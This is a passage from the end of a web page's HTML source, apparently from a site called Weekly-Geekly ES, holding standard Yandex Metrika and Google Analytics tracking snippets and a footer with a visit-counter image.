      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>